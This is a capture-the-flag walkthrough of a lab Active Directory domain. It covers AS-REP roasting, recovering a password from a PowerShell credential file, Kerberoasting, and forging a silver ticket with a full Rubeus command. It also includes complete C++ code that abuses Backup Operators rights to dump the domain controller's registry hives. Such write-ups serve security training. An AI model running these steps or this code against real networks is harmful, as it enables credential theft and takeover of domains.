# Lustrous (chain) (medium)

## port scan

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411131333242.png)

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411120000539.png)

## service enumeration

ftp allow anonymous login

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411115748466.png)

some user directory

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411115819698.png)

have a users.csv

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411120158629.png)

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411120215821.png)

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411120549548.png)

## ASREPRoast

ben.cox user lack of Kerberos pre-authentication

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411120752163.png)

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411120959828.png)

we can winrm into LUSMS

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411122234308.png)

## privilege escalation on lusms

there have admin.xml (PSCred)

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411122350299.png)

we can use those powershell command get plain password

```powershell
$AdminCred = Import-Clixml -Path C:\users\ben.cox\desktop\admin.xml
$Password = $AdminCred.GetNetworkCredential().Password
```

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411122957202.png)

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411123200016.png)

## spn user

there are some service account

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411125825486.png)

hashcat

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411130043908.png)

now we have svc\_web password

convert to hash

```bash
python -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "iydgTvmujl6f".encode("utf-16le")).digest()))'
```

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411140926704.png)

## silver ticket

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411140823406.png)

the tony.ward is backup

we can use rubeus to make a silver ticket login web page as `tony.ward` user. (those sid/id get from bloodhound)

```
dotnet inline-execute /opt/Rubeus.exe silver /service:http/lusdc.lustrous.vl /rc4:e67af8b3d78df5a02eb0d57b6cb60717 /user:tony.ward /domain:lustrous.vl /sid:S-1-5-21-2355092754-1584501958-1513963426 /id:1114 /nowrap /ptt
```

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411135910226.png)

```powershell
powershell Invoke-WebRequest -Uri http://lusdc.lustrous.vl/Internal -UseDefaultCredentials -UseBasicParsing | Select-Object -Expand Content
```

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411140048121.png)

## abuse backup admin

there have a code can remote dump sam with backup user

https://github.com/Wh04m1001/Random/blob/main/BackupOperators.cpp

```cpp
#include <stdio.h>
#include <windows.h>

void MakeToken() {
    HANDLE token;
    const char username[] = "tony.ward";
    const char password[] = "U_cPVQqEI50i1X";
    const char domain[] = "lustrous.vl";

    if (LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &token) == 0) {
        printf("LogonUserA: %d\n", GetLastError());
        exit(0);
    }
    if (ImpersonateLoggedOnUser(token) == 0) {
        printf("ImpersonateLoggedOnUser: %d\n", GetLastError());
        exit(0);
    }
}

int main()
{
    HKEY hklm;
    HKEY hkey;
    DWORD result;
    const char* hives[] = { "SAM","SYSTEM","SECURITY" };
    const char* files[] = { "C:\\windows\\temp\\sam.hive","C:\\windows\\temp\\system.hive","C:\\windows\\temp\\security.hive" };

    //Uncomment if using alternate credentials.
    MakeToken();

    result = RegConnectRegistryA("\\\\lusdc.lustrous.vl", HKEY_LOCAL_MACHINE,&hklm);
    if (result != 0) {
        printf("RegConnectRegistryW: %d\n", result);
        exit(0);
    }
    for (int i = 0; i < 3; i++) {

        printf("Dumping %s hive to %s\n", hives[i], files[i]);
        result = RegOpenKeyExA(hklm, hives[i], REG_OPTION_BACKUP_RESTORE | REG_OPTION_OPEN_LINK, KEY_READ, &hkey);
        if (result != 0) {
            printf("RegOpenKeyExA: %d\n", result);
            exit(0);
        }
        result = RegSaveKeyA(hkey, files[i], NULL);
        if (result != 0) {
            printf("RegSaveKeyA: %d\n", result);
            exit(0);
        }
    }
}

```

compile code

```bash
x86_64-w64-mingw32-g++ ./dump.cpp -o dump
```

those file will save at dc machine

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411150636036.png)

we can use smbclient download those file

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411150617663.png)

use pypykatz to get dc machine hash

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411151014308.png)

dump all!

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411151417319.png)

![](lustrous\(chain\)\(medium\)/walkthrough\_20240411151527456.png)
